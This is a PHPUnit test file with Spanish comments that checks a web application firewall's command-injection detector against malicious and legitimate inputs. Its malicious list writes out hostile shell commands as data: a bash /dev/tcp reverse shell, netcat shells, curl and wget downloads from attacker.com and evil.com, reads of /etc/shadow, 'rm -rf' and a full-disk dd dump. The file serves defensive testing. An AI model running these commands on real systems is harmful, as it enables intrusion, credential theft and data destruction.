<?php

declare(strict_types=1);

namespace Tests\Waf\Detection;

use PHPUnit\Framework\TestCase;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use Tests\Waf\WafDetectionProbe;

/**
 * CommandInjectionTest — verifica el detector de inyección de comandos OS.
 */
final class CommandInjectionTest extends TestCase
{
    private WafDetectionProbe $probe;

    protected function setUp(): void
    {
        $this->probe = new WafDetectionProbe();
    }

    // ── TRUE POSITIVES ────────────────────────────────────────────────────────

    #[DataProvider('maliciousPayloads')]
    #[Test]
    public function detectsMaliciousPayload(string $payload): void
    {
        self::assertTrue(
            $this->probe->detectCmdInjection($payload),
            "Se esperaba que detectara Command Injection en: [{$payload}]"
        );
    }

    public static function maliciousPayloads(): array
    {
        return [
            // Lectura de archivos
            'cat_passwd'             => ['cat /etc/passwd;'],
            'cat_pipe'               => ['cat /etc/shadow | base64'],

            // Reconocimiento
            'whoami_semicolon'       => ['whoami;'],
            'ls_la_pipe'             => ['ls -la | grep root'],
            'pwd_backtick'           => ['pwd`'],

            // Descarga de payloads
            'curl_pipe'              => ['curl http://attacker.com/shell.sh;'],
            'wget_execute'           => ['wget http://evil.com/x.sh;'],

            // Shells
            'bash_pipe'              => ['bash -i >& /dev/tcp/10.0.0.1/4444 0>&1|'],
            'sh_semicolon'           => ['sh -c "id";'],
            'python3_reverse'        => ['python3 -c "import socket;s=socket.socket()";'],
            'php_exec'               => ['php -r "system(\'id\');";'],
            'node_exec'              => ['node -e "require(\'child_process\').exec(\'id\')"|'],

            // Netcat
            'nc_connect'             => ['nc -e /bin/sh 10.0.0.1 4444|'],
            'netcat'                 => ['netcat -lvp 4444|'],

            // Manipulación de permisos
            'chmod_suid'             => ['chmod 4755 /tmp/shell;'],
            'chown_root'             => ['chown root /tmp/x;'],

            // Eliminación y movimiento
            'rm_rf'                  => ['rm -rf /var/www;'],
            'mv_overwrite'           => ['mv /etc/passwd /tmp/p;'],
            'cp_sensitive'           => ['cp /etc/shadow /tmp/s;'],

            // Exfiltración
            'base64_encode_cmd'      => ['base64 /etc/passwd >'],
            'tar_exfil'              => ['tar czf /tmp/x.tgz /etc/|'],
            'dd_copy'                => ['dd if=/dev/sda of=/tmp/disk.img;'],
        ];
    }

    // ── TRUE NEGATIVES ────────────────────────────────────────────────────────

    #[DataProvider('legitimateInputs')]
    #[Test]
    public function allowsLegitimateInput(string $input): void
    {
        self::assertFalse(
            $this->probe->detectCmdInjection($input),
            "Falso positivo en entrada legítima: [{$input}]"
        );
    }

    public static function legitimateInputs(): array
    {
        return [
            'plain_text'            => ['Hola mundo'],
            'file_name'             => ['report_2026.pdf'],
            'path_no_operator'      => ['/var/www/html/index.php'],
            'email'                 => ['noe@example.com'],
            'math_expression'       => ['precio > 100'],         // > but no command
            'description_with_echo' => ['Please echo your name'],// echo sin operador
            'pipe_word_no_cmd'      => ['data pipeline analysis'],
        ];
    }
}